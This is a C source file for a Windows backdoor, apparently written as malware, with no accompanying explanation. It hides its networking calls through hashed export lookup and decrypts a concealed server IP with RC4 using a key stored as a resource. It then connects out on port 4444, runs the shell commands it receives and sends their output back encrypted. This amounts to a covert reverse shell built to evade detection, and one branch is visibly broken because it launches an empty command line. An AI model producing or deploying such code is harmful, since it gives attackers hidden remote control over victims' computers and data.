#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#define PORT 4444
#define BUFFER_SIZE 4096
typedef int (WINAPI *connect_t)(SOCKET, const struct sockaddr*, int);
typedef SOCKET (WINAPI *socket_t)(int, int, int);
typedef int (WINAPI *send_t)(SOCKET, const char*, int, int);
typedef int (WINAPI *recv_t)(SOCKET, char*, int, int);
typedef int (WINAPI *closesocket_t)(SOCKET);
typedef DWORD (WINAPI *inet_addr_t)(const char*);
BYTE encIP[16] = {
    0x7d, 0xb2, 0x64, 0xb3, 0x86, 0xf9, 0x0b, 0x10, 
                   0x5f, 0x48, 0x2e, 0xf2, 0x8a, 0x29, 0xd7
};
DWORD hash_api(const char* name, BYTE* key) {
    size_t key_len = strlen((char*)key);
    DWORD hash = 0x1337BEEF;
    size_t i = 0;
    while (*name) {
        hash ^= *name;
        hash = _rotl(hash, 7);
        hash += key[i % key_len];
        name++;
        i++;
    }
    return hash;
}
BYTE* get_resource_data(DWORD* pSize) {
    HMODULE hModule = GetModuleHandleA(NULL);
    HRSRC hRes = FindResourceA(hModule, "CONFIG", "DATA");
    if (!hRes) return NULL;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return NULL;

    DWORD size = SizeofResource(hModule, hRes);
    if (pSize) *pSize = size;

    return (BYTE*)LockResource(hResData);
}
FARPROC resolve_api_by_hash(const char* dll_name, DWORD target_hash, BYTE* key) {
    HMODULE hModule = LoadLibraryA(dll_name);
    if (!hModule) return NULL;

    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* func_name = (char*)(base + names[i]);
        DWORD h = hash_api(func_name, key);
        if (h == target_hash) {
            DWORD func_rva = functions[ordinals[i]];
            return (FARPROC)(base + func_rva);
        }
    }

    return NULL;
}
BOOL rc4_decrypt(BYTE* key, DWORD key_len, BYTE* in, BYTE* out, DWORD data_len) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    DWORD len = data_len;

    struct {
        BLOBHEADER hdr;
        DWORD len;
        BYTE key[256];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_RC4;
    keyBlob.len = key_len;
    memcpy(keyBlob.key, key, key_len);

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return FALSE;

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + key_len, 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    memcpy(out, in, len);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, out, &len)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}
DWORD base64_decode(char *input, BYTE **output) {
    DWORD out_len = 0;
    DWORD input_len = strlen(input);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL);

    *output = (BYTE*)malloc(out_len);
    if (!*output) return 0;

    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &out_len, NULL, NULL)) {
        free(*output);
        return 0;
    }
    return out_len;
}
DWORD base64_encode(const BYTE* input, DWORD input_len, char** output) {
    DWORD encoded_len = 0;

    // Bước 1: Lấy độ dài chuỗi base64 sau encode
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_len)) {
        return 0;
    }

    // Bước 2: Cấp phát bộ nhớ
    *output = (char*)malloc(encoded_len);
    if (!*output) {
        return 0;
    }

    // Bước 3: Thực hiện encode
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *output, &encoded_len)) {
        free(*output);
        *output = NULL;
        return 0;
    }

    return encoded_len;
}
int main() {
    DWORD key_len = 0;
    BYTE* key = get_resource_data(&key_len);
    if (!key || key_len == 0) {
        return 1;
    }

    DWORD h_socket = 0xF0D2746A;
    DWORD h_connect = 0x195C4F50;
    DWORD h_send = 0xC68505AD;
    DWORD h_recv = 0xD687CCAD;
    DWORD h_close = 0xB07AA821;
    DWORD h_inetaddr = 0x32C79351;

    socket_t my_socket = (socket_t)resolve_api_by_hash("ws2_32.dll", h_socket, key);
    connect_t my_connect = (connect_t)resolve_api_by_hash("ws2_32.dll", h_connect, key);
    send_t my_send = (send_t)resolve_api_by_hash("ws2_32.dll", h_send, key);
    recv_t my_recv = (recv_t)resolve_api_by_hash("ws2_32.dll", h_recv, key);
    closesocket_t my_closesocket = (closesocket_t)resolve_api_by_hash("ws2_32.dll", h_close, key);
    inet_addr_t my_inet_addr = (inet_addr_t)resolve_api_by_hash("ws2_32.dll", h_inetaddr, key);

    if (!my_socket || !my_connect || !my_send || !my_recv || !my_closesocket || !my_inet_addr) {
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }
    DWORD lenIP = 16;
    BYTE decrypted[16] = {0};
    if (!rc4_decrypt(key, key_len, encIP, decrypted, lenIP)) {
        return 1;
    }

    char ip_str[16] = {0};
    memcpy(ip_str, decrypted, 15);

    SOCKET s = my_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PORT);
    srv.sin_addr.s_addr = my_inet_addr(ip_str);

    if (my_connect(s, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        my_closesocket(s);
        return 1;
    }

    char buffer[BUFFER_SIZE];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int received = my_recv(s, buffer, BUFFER_SIZE - 1, 0);
        if (received <= 0) break;

        buffer[received] = 0;

        if (buffer[0] == 's') {
            Sleep(100);
            continue;
        }

        if (buffer[0] == 'd') {
            char *encoded = NULL;
            if(buffer[1] == 'c'){
                char *encoded = buffer + 2;
                BYTE* decoded_base64 = NULL;
                DWORD decoded_len = base64_decode(encoded, &decoded_base64);
                if (decoded_len == 0) {
                    continue;
                }
            
                BYTE decrypted_payload[8096] = {0};
                if (!rc4_decrypt(key, key_len, decoded_base64, decrypted_payload, decoded_len)) {
                    free(decoded_base64);
                    continue;
                }

                STARTUPINFOA si = { 0 };
                PROCESS_INFORMATION pi = { 0 };
                si.cb = sizeof(si);
                char cmdline[8096] = {0};
                BOOL success = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                if (!success) {
                    continue;
                } else {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }

                free(decoded_base64);
                continue;
            }
            else if(buffer[1] == 'd'){
                char *encoded = buffer + 2;
                BYTE* decoded_base64 = NULL;
                DWORD decoded_len = base64_decode(encoded, &decoded_base64);
                if (decoded_len == 0) {
                    continue;
                }
            
                BYTE decrypted_payload[8096] = {0};
                if (!rc4_decrypt(key, key_len, decoded_base64, decrypted_payload, decoded_len)) {
                    free(decoded_base64);
                    continue;
                }
                FILE* pipe = _popen((const char*)decrypted_payload, "r");
                if (!pipe) break;

                char readbuf[BUFFER_SIZE];
                while (fgets(readbuf, sizeof(readbuf), pipe)) {
                    size_t read_len = strlen(readbuf);
                    BYTE encrypted[BUFFER_SIZE] = {0};
                    if (!rc4_decrypt(key, key_len, (BYTE*)readbuf, encrypted, (DWORD)read_len)) {
                    continue;
                    }
                    char* encoded = NULL;
                    DWORD encoded_len = base64_encode(encrypted, (DWORD)read_len, &encoded);

                    if (encoded_len == 0 || !encoded) {
                        continue;
                    }
                    my_send(s, encoded, (int)encoded_len, 0);
                    free(encoded);
                    }
                _pclose(pipe);
            }
        }
        if (strncmp(buffer, "exit", 4) == 0)
            break;
    }

    my_closesocket(s);
    WSACleanup();
    return 0;
}
